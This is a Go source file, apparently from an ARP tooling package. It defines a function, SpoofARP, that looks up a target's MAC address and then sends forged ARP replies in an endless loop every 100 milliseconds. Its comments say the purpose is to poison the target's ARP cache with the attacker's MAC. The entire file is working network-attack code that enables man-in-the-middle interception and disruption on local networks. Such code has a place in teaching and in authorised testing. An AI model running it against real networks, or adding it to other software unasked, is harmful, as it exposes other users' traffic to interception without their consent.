package arptools

import (
	"fmt"
	"github.com/torbenconto/arp-tools/cmd/ethernet"
	"net"
	"time"
)

func SpoofARP(targetIP, spoofedIP net.IP, intf *net.Interface) error {
	// Create a new ARP instance
	arp := NewArp(intf)

	// Resolve target MAC address by sending an ARP request
	targetPacket, err := arp.Resolve(targetIP)
	if err != nil {
		return fmt.Errorf("failed to resolve target MAC: %w", err)
	}

	// Send continuous ARP reply packets to poison the target's ARP cache
	for {
		// Construct ARP reply packet
		packet := NewPacket(
			ethernet.ARPEtherType,
			ethernet.EthernetHardwareType,
			ethernet.IPv4ProtocolType,
			6,
			4,
			ethernet.RecvOpcode,            // ARP reply
			targetPacket.SourceMAC,         // Target's MAC (who will accept the fake reply)
			targetIP,                       // Target IP
			arp.Socket.Intf().HardwareAddr, // Attacker's MAC (pretend to be the spoofed IP)
			spoofedIP,                      // Spoofed IP (pretend this is the attacker's IP)
		)

		// Marshal the ARP packet to bytes
		data, err := packet.Marshal()
		if err != nil {
			return fmt.Errorf("failed to marshal packet: %w", err)
		}

		// Send the ARP packet to the target
		err = arp.Socket.Write(data)
		if err != nil {
			return fmt.Errorf("failed to send ARP reply: %w", err)
		}

		// Sleep for a short period before sending the next spoofing packet
		time.Sleep(100 * time.Millisecond)
	}
}
